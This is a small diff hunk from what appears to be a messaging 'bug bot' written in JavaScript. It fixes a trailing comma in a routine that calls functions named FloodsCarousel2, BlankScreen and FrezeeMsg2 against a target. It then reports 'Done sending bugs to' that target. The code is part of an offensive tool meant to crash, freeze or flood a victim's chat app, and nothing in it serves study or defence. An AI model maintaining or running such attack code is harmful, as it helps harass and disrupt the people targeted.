@@ -2872,7 +2872,7 @@ await FloodsCarousel2(target, Ptcp = true)
 await BlankScreen(target, Ptcp = true)
 await FrezeeMsg2(target)
 await OLDLOC(target, TypeNull)
-await bak2(target, ptcp = true),
+await bak2(target, ptcp = true)
 }
 await replygcxeon (`Done sending bugs to ${target} using ${command}`)
 }
